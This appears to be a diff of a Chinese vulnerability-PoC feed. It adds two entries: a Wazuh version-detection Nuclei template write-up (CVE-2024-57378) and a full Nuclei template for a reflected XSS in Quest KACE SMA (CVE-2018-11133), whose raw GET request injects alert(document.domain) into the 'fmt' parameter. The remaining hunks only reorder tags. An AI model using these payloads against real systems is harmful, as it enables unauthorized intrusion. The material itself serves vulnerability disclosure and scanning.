@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>Wazuh Web Interface 版本检测漏洞</title>
+    <link href="/2025/06/10/github_1583484575/"/>
+    <url>/2025/06/10/github_1583484575/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wazuh Web Interface 版本检测漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-57378</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 该漏洞涉及Wazuh Web Interface的版本检测问题，通过特定的Nuclei HTTP模板可以检测目标URL（及其&#x2F;app&#x2F;login页面）是否为Wazuh web界面，提取wazuhVersion值，并确认页面可访问（200状态）且确实是Wazuh UI（通过标题和关键词匹配）。如果提取的版本为4.8.2，Nuclei会报告匹配。</p><p><strong>产品厂商：</strong> Wazuh</p><p><strong>产品名称：</strong> Wazuh Web Interface</p><p><strong>影响版本：</strong> 4.8.2</p><p><strong>来源：</strong> <a href="https://github.com/rxerium/CVE-2024-57378">https://github.com/rxerium/CVE-2024-57378</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2024-57378.yaml</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2024-57378"><a href="#CVE-2024-57378" class="headerlink" title="CVE-2024-57378"></a>CVE-2024-57378</h2><h2 id="How-does-this-detection-method-work"><a href="#How-does-this-detection-method-work" class="headerlink" title="How does this detection method work?"></a>How does this detection method work?</h2><p>This Nuclei HTTP template checks a target URL (and its &#x2F;app&#x2F;login page) for the Wazuh web interface, extracts the wazuhVersion value with a regex, and confirms the page is accessible (200 status) and actually a Wazuh UI (via title and keyword match). If the extracted version is 4.8.2, Nuclei reports a match</p><h2 id="How-do-I-run-this-script"><a href="#How-do-I-run-this-script" class="headerlink" title="How do I run this script?"></a>How do I run this script?</h2><ol><li>Download Nuclei from <a href="https://github.com/projectdiscovery/nuclei">here</a></li><li>Copy the template to your local system</li><li>Run the following command: <code>nuclei -u https://yourHost.com -t template.yaml</code></li></ol><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57378">https://nvd.nist.gov/vuln/detail/CVE-2024-57378</a></li></ul><h3 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h3><p>Use at your own risk, I will not be responsible for illegal activities you conduct on infrastructure you do not own or have permission to scan.</p><h3 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h3><p>Feel free to reach out to me on <a href="https://signal.me/#eu/0Qd68U1ivXNdWCF4hf70UYFo7tB0w-GQqFpYcyV6-yr4exn2SclB6bFeP7wTAxQw">Signal</a>.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息泄露</tag>
+      
+      <tag>CVE-2024:github search</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Quest KACE SMA /common/run_cross_report.php &#39;fmt&#39; XSS</title>
+    <link href="/2025/06/10/github_2256219304/"/>
+    <url>/2025/06/10/github_2256219304/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Quest KACE SMA &#x2F;common&#x2F;run_cross_report.php ‘fmt’ XSS</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11133</li></ul><p><strong>漏洞类型：</strong> 跨站可执行脚本</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Quest KACE System Management Appliance 8.0.318中的’&#x2F;common&#x2F;run_cross_report.php’脚本的’fmt’参数容易受到跨站脚本攻击。</p><p><strong>产品厂商：</strong> quest</p><p><strong>产品名称：</strong> kace_system_management_appliance</p><p><strong>影响版本：</strong> 8.0.318</p><p><strong>搜索语法：</strong> title:”KACE Systems Management”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/0151d6e80c178ef1e68f3302717e4518ede983c8/http%2Fcves%2F2018%2FCVE-2018-11133.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/0151d6e80c178ef1e68f3302717e4518ede983c8/http%2Fcves%2F2018%2FCVE-2018-11133.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11133</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Quest KACE SMA <span class="hljs-symbol">/common/run_cross_report.php</span> &#x27;fmt&#x27; XSS<br>  <span class="hljs-params">author:</span> iamnoooob,pdresearch<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    The &#x27;fmt&#x27; parameter of the &#x27;<span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>run_cross_report.php&#x27; script <span class="hljs-keyword">in</span> the the Quest KACE System Management Appliance <span class="hljs-number">8.0</span>.<span class="hljs-number">318</span> is vulnerable to cross-site scripting.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2018-11133</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:R<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:L<span class="hljs-operator">/</span>I:L<span class="hljs-operator">/</span>A:N<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">6.1</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11133</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">79</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00298</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.52729</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:quest:kace_system_management_appliance:<span class="hljs-number">8.0</span>.<span class="hljs-number">318</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> quest<br>    <span class="hljs-params">product:</span> kace_system_management_appliance<br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;KACE Systems Management&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2018,xss,quest,kace,sma<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>run_cross_report.php<span class="hljs-operator">?</span>uniqueId<span class="hljs-operator">=</span><span class="hljs-number">366314513</span>&amp;id<span class="hljs-operator">=</span><span class="hljs-number">585</span>&amp;org<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;fmt<span class="hljs-operator">=</span>xls34403&#x27;)%<span class="hljs-number">3</span>balert(document.domain)%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f952 HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;xls34403&#x27;);alert(document.domain)//952&#x27;);&quot;</span><br>          <span class="hljs-operator">-</span> &#x27;k-run-report-message&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>           <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>跨站可执行脚本</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Dahua IPC/VTH/VTO 认证绕过漏洞</title>
     <link href="/2025/06/10/github_1353949014/"/>
     <url>/2025/06/10/github_1353949014/</url>
@@ -571,9 +625,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -2071,9 +2125,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -2260,9 +2314,9 @@
     
     <tags>
       
-      <tag>CVE-2023:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2023:github search</tag>
       
     </tags>
     
@@ -2395,9 +2449,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -2638,9 +2692,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -3016,9 +3070,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -3205,9 +3259,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -3232,9 +3286,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -3286,9 +3340,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -3448,9 +3502,9 @@
     
     <tags>
       
-      <tag>CVE-2023:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2023:github search</tag>
       
     </tags>
     
@@ -3853,9 +3907,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -3880,9 +3934,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -4391,9 +4445,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -4418,9 +4472,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -4445,9 +4499,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -4634,9 +4688,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -4688,9 +4742,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -4769,9 +4823,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -5201,9 +5255,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -5255,9 +5309,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -5282,9 +5336,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -5309,9 +5363,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -5336,9 +5390,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -5471,9 +5525,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -5552,9 +5606,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -5579,9 +5633,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -5903,9 +5957,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -6119,9 +6173,9 @@
     
     <tags>
       
-      <tag>CVE-2023:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2023:github search</tag>
       
     </tags>
     
@@ -6605,9 +6659,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -6632,9 +6686,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -7332,9 +7386,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -8377,9 +8431,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -8697,9 +8751,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -8724,9 +8778,9 @@
     
     <tags>
       
-      <tag>CVE-2024:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2024:github search</tag>
       
     </tags>
     
@@ -8851,9 +8905,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -8905,9 +8959,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -8986,9 +9040,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -9146,9 +9200,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
